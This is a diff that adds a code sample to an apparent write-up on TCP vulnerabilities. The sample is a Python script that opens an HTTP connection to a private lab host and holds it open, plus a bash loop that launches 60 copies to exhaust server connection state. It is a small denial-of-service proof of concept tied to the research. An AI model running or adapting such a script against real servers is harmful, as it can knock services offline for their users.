@@ -134,6 +134,32 @@ reference：
 7. Recurity Labs on TCP Vulnerabilities
 http://www.recurity-labs.com/content/pub/25C3TCPVulnerabilities.pdf
 
- 
+
+
+code sample:
+
+
+import socket
+
+import time
+
+HOST='10.11.0.90'
+PORT=10096
+
+GET='/mobileassistant-strategy/download/BaiduStars.apk'
+
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect((HOST,PORT))
+sock.send("GET %s HTTP/1.0\r\nHost:%s\r\n\r\n" % (GET,HOST))
+time.sleep(100000)
+
+
+
+#!/bin/bash
+
+for i in `seq 1 60` ;do
+	python finwait.py &
+	sleep 3
+done
 
 
